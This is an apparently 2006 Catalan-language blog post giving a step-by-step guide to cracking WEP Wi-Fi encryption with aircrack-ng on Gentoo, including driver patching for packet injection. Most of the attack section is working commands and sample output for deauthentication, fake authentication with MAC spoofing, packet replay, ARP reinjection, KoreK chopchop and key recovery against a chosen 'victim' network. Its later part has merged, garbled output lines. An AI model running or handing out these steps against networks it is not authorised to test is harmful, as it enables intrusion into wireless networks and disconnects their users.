---
layout: post
title: WEP Cracking amb aircrack-ng
date: 2006-04-27 03:44:29.000000000 +02:00
type: post
categories:
- linux
- security
- wireless
tags: []
meta:
  tags: aircrack aircrack-ng wifi wireless security wep cracking
permalink: "/2006/04/27/wep-cracking-amb-aircrack-ng/"
---
<p><img src="{{ site.baseurl }}/assets/images/2006/04/aircrack-ng.png" class="dreta" /></p>
<p>Fa un any parlàvem de <a href="/blog/2005/06/12/com-trencar-la-encriptacio-wep-en-10-minuts/">com trencar la encriptació WEP</a> amb aircrack, actualment està disponible <a href="http://www.aircrack-ng.org/">aircrack-ng</a>: <em>aircrack next generation</em>, un fork del aircrack original que inclou noves funcionalitats per auditar xarxes sense fils.</p>
<p>Han muntat <a href="http://www.aircrack-ng.org/">un wiki</a> i <a href="http://forum.aircrack-ng.org/">un fòrum</a> amb moltíssima documentació i molt ben organitzada, si us interessa el tema feu-li un cop d'ull.</p>
<p>Els parches per als mòduls de kernel dels diferents xipsets es continuen desenvolupant, els <a>podeu trobar aquí</a>, també hi ha disponible al wiki la <a href="http://www.aircrack-ng.org/index.php?title=Installing_drivers">documentació per parchejar els drivers</a>.</p>
<p>Seguint la <a href="http://www.aircrack-ng.org/index.php?title=Madwifi-ng">documentació per madwifi-ng</a> he adaptat el procés per fer-ho directament des de el <tt>portage</tt> de <a href="http://www.gentoo.org/">Gentoo</a>, us deixo les instruccions a continuació.</p>
<p>El aircrack-ng ja està al portage; en el moment d'escriure això la última versió és la 0.4.4 i la de portage no està actualitzada però podeu instal·lar la última només canviant-li el nom a l'ebuild i executant un <code>ebuild digest</code>.</p>
<h3>Parchejar madwifi-ng de Gentoo per reinjectar tràfic amb aircrack-ng</h3>
<p>Baixar el <a href="http://patches.aircrack-ng.org/">patch de patches.aircreack-ng.org</a> corresponent a la versió de madwifi que tinguem actualment a portage. Copiar el patch a la carpeta  <code>/usr/portage/net-wireless/madwifi-ng/files/</code>.</p>
<p>Editar el ebuild de madwifi-ng, i a la funció <tt>src_unpack()</tt> afegir el <tt>epatch</tt> després del <tt>cd ${S}</tt>:</p>
<pre>
    cd ${S}
    <strong>epatch ${FILESDIR}/madwifi-ng-r1520.patch</strong>
</pre>
<p>Executar <code>ebuild madwifi-ng-[versió].ebuild digest</code>, i després fer el emerge madwifi de forma normal.</p>
<p>Cal recordar que si utilitzem wpa_supplicant o hostapd amb madwifi s'han de tornar a compilar després d'actualitzar madwifi-ng</p>
<h3>Guia ràpida de WEP cracking amb aircrack-ng</h3>
<p>Un cop he tingut el sistema preparat, he fet un parell de proves per veure que tot funciona bé, tota la documentació està al wiki que he comentat abans, però per als impacients aquí teniu una petita guia dels passos que he seguit.</p>
<p>Primer s'ha de posar la targeta en mode monitor, aircrack-ng porta un <em>shell script</em> que detecta el xipset de la nostra targeta wifi i ho fa per nosaltres, només cal executar <code>airmon-ng</code> que és l'equivalent al <em>airmon.sh</em> del aircrack antic. Si volem fer-ho manualment, amb madwifi-ng <a href="http://madwifi.org/wiki/UserDocs/MonitorModeInterface">ha canviat la sintaxis</a> i ja no es pot fer amb iwconfig, sinó que s'han d'utilitzar les <tt>madwifi-tools</tt>. Aquí teniu els dos exemples:</p>
<p><!--more--></p>
<pre>
# wlanconfig ath0 create wlandev wifi0 wlanmode monitor
</pre>
<pre>
# airmon-ng start wifi0

usage: airmon-ng &lt;start|stop&gt; &lt;interface&gt; [channel]

Interface       Chipset         Driver

ath0            Atheros         madwifi-ng VAP (parent: wifi0)
wifi0           Atheros         madwifi-ng (monitor mode enabled)
</pre>
<p>Això ens crearà la interface <tt>ath1</tt> en mode monitor. Seguidament hem d'executar <code>airodump-ng</code> per veure les xarxes wifi disponibles, i els possibles clients connectats a cada AP.</p>
<pre>
# airodump-ng -w capturefile ath1

 CH  9 ][ Elapsed: 56 s ][ 2006-04-27 02:50

 BSSID              PWR  Beacons   # Data  CH  MB  ENC   ESSID

 00:14:BF:42:4B:2B  151      102        0   3  48  OPN   pofHQhotspot
 00:C0:94:1F:3D:49  109       61        7   6  48  WEP   pofHQWep
 00:06:25:7D:71:5D  128       65        0   1  48  WPA   pofHQ

 BSSID              STATION            PWR  Packets  Probes
</pre>
<p>Un cop hem seleccionat la xarxa víctima (en aquest exemple serà <em>pofHQWep</em>) anotem el ESSID, BSSID i si hi ha clients connectats també les MACs dels clients. Premem CTRL+C per sortir de <tt>airodump-ng</tt> i continuem el procés.</p>
<p>Tornem a executar <tt>airodump-ng</tt>, amb la següent sintaxis per capturar els IVs per fer l'atac i fixant-lo al canal de la WLAN que volem atacar.</p>
<pre>
# airodump-ng -c 6 --ivs -w capturefile ath1
</pre>
<p>Ara hem de deixar el <tt>airodump-ng</tt> funcionant, i canviem a un altre terminal.</p>
<p>El procés és una mica <strong>més complicat si no trobem cap client connectat</strong> a la xarxa, en aquest cas haurem de jugar una mica més per poder reinjectar tràfic, aquests són els diferents atacs que podem realitzar amb l'objectiu d'augmentar el tràfic de la xarxa per recollir IVs que revelin informació de la clau.</p>
<h4>Deauthentication attack</h4>
<p>Aquest atac ens permet recuperar un SSID ocult (que no tingui broadcast), capturar handshakes WPA forçant que els clients es reautentiquen, i generar ARP requests ja que els clients Windows buiden la cache d'ARP quan son desconnectats. Evidentment, aquest atac no serà efectiu si no hi ha cap client associat a la xarxa.</p>
<p>Intentem trobar la MAC d'un client, primer provem desautenticant a totes les estacions:</p>
<pre>
# aireplay-ng -a 00:C0:94:1F:3D:49 --deauth 3 ath1
NB: this attack is more effective when targeting
a connected wireless client (-c &lt;client's mac&gt;).
02:59:15  Sending DeAuth to broadcast -- BSSID: [00:C0:94:1F:3D:49]
02:59:16  Sending DeAuth to broadcast -- BSSID: [00:C0:94:1F:3D:49]
02:59:17  Sending DeAuth to broadcast -- BSSID: [00:C0:94:1F:3D:49]
</pre>
<p>Si algun client fos desautenticat airodump-ng veuria com es reautentica i apareixeria la seva mac a la llista de clients. Podem repetir l'atac amb el paràmetre <code>-c</code> per atacar a un client específic.</p>
<p>Si amb aquest atac no tenim sort (xej, no hi ha cap client connectat), podem provar forçant una autenticació falsa:</p>
<h4>Fake authentication attack</h4>
<p>Aquest atac només es útil quan no hi ha cap client associat, sempre és millor executar-lo amb l'adreça MAC d'un client real.</p>
<p>El primer pas és fixar-nos la nostra MAC a la que utilitzarem per fer l'autenticació falsa (en l'exemple ca:fe:ca:fe:ca:fe), d'aquesta manera els següents atacs tenen més probabilitats de funcionar correctament.</p>
<pre>
# ifconfig ath0 down
# ifconfig ath0 hw ether ca:fe:ca:fe:ca:fe
# ifconfig ath0 up
</pre>
<pre>
# aireplay-ng -e "pofHQWep" -a 00:C0:94:1F:3D:49 -h ca:fe:ca:fe:ca:fe --fakeauth 30 ath1
03:02:56  Sending Authentication Request
03:02:56  Authentication successful
03:02:56  Sending Association Request
03:02:56  Association successful : -)
[...]
</pre>
<p>Si l'atac falla (aireplay-ng continua enviant peticions d'autenticació), es possible que el AP tingui configurat filtrat per MAC.</p>
<h4>Interactive packet replay attack</h4>
<p>Aquest atac permet triar un paquet determinat per injectar-lo i esperar una resposta que generi tràfic xifrat vàlid, moltes vegades és més efectiu que l'atac de reinjecció d'arp-request.</p>
<p>Es pot forçar el re-broadcast de tot el tràfic que veiem, (només funciona si l'AP reencripta els paquets WEP):</p>
<pre>
# aireplay-ng --interactive -b 00:C0:94:1F:3D:49 -n 100 -p 0841 \
-h ca:fe:ca:fe:ca:fe -c FF:FF:FF:FF:FF:FF ath1
</pre>
<h4>ARP-request reinjection attack</h4>
<p>El clàssic atac d'arp-request / reply és el mes efectiu per generar nous IVs i funciona en la gran majoria de casos. Per dur-lo a terme necessitem la MAC d'un client associat, o una MAC falsa que hagem utilitzat en l'atac de <em>Fake Authentication</em>. Haurem d'esperar fins que aireplay-ng capturi un paquet ARP request, i a partir de llavors ja podem gaudir de veure com augmenta el comptador de IVs al aircrack-ng.</p>
<p>Es pot reutilitzar un ARP request d'una captura prèvia utilitzant la opció <code>-r</code>.</p>
<pre>
# aireplay-ng --arpreplay -b 00:C0:94:1F:3D:49 -h ca:fe:ca:fe:ca:fe ath1
Saving ARP requests in replay_arp-0427-031636.cap
You should also start airodump-ng to capture replies.
Read 1234 packets (got 0 ARP requests), sent 0 packets...
</pre>
<h4>KoreK chopchop attack</h4>
<p>Aquest és un dels atacs mes macos del aircrack-ng, si funciona correctament pot desencriptar un paquet xifrat amb WEP sense conèixer la clau, fins i tot és possible que funcioni contra WEP dinàmic!. Aquest atac no recupera la clau WEP, però revel·la el plaintex d'un paquet xifrat (recordeu que PLAINTEXT (xor) CIPHERTEXT == keystream). La llàstima és que la majoria de punts d'accés no son vulnerables, però sempre s'ha d'intentar! Els passos per executar l'atac a continuació:</p>
<p>Primer desencriptem un paquet:</p>
<pre>
# aireplay-ng --chopchop -h ca:fe:ca:fe:ca:fe ath1
Read 286 packets...

        Size: 345, FromDS: 1, ToDS: 0 (WEP)

             BSSID  =  00:C0:94:1F:3D:49
         Dest. MAC  =  01:00:5E:7F:FF:FA
        Source MAC  =  00:C0:49:D3:B6:4D
[...]
        --- CUT ---
Use this packet ? yes Saving chosen packet in replay\_src-0427-031148.cap Offset 344 ( 0% done) | xor = 65 | pt = 65 | 423 frames written in 3276ms Offset 343 ( 0% done) | xor = AF | pt = 32 | 412 frames written in 3967ms Sent 343 packets, current guess: 55...

Mirem quina és l'adreça IP:

```
# tcpdump -s 0 -n -e -r replay\_src-0427-031148.cap reading from file replay\_dec-0627-022301.cap, link-type [...] IP 192.168.1.2 \> 192.168.1.255: icmp 64: echo request seq 1
```

Forcem un ARP request, podem posar el que vulguem com a IP d'origen (en l'exemple 192.168.1.100), però es important que la IP de destí (en l'exemple 192.168.1.2) contesti els ARP requests. La MAC d'origen ha de pertànyer a una estació associada.

```
# arpforge-ng replay\_dec-0427-031148.xor 1 00:C0:49:D3:B6:4D \ 01:00:5E:7F:FF:FA 192.168.1.100 192.168.1.2 arp.cap
```

A continuació reinjectem el arp-request que hem construït, utilitzant l'atac comentat anteriorment:

```
# aireplay-ng --reply -r arp.cap ath1
```

#### Obtenint resultats

Mentre fem els diferents atacs en background, obrim un altre terminal per executar l'aircrack-ng, que llegirà els IVs del fitxer que hem indicat anteriorment al llançar l'airodump-ng. Aquest és el procés és el que finalment recuperarà la clau. Generalment llançant-lo amb aquesta sintaxis és efectiu:

```
# aircrack-ng -0 -x capturefile-03.ivs [00:01:43] Tested 1991733 keys (got 217865 IVs) [...]
```

Quan tinguem [suficients IVs](http://www.aircrack-ng.org/index.php?title=FAQ#How_do_I_know_my_WEP_key_is_correct_.3F) apareixerà el missatge `KEY FOUND!` amb la clau WEP. Si veieu que triga molt o tot i que teniu molts IVs és incapaç de trobar la clau podeu jugar amb [les diferents opcions](http://www.aircrack-ng.org/index.php?title=Aircrack-ng), per exemple desactivant els atacs d'en korek un a un.

Don't be (_too_) evil! ;)

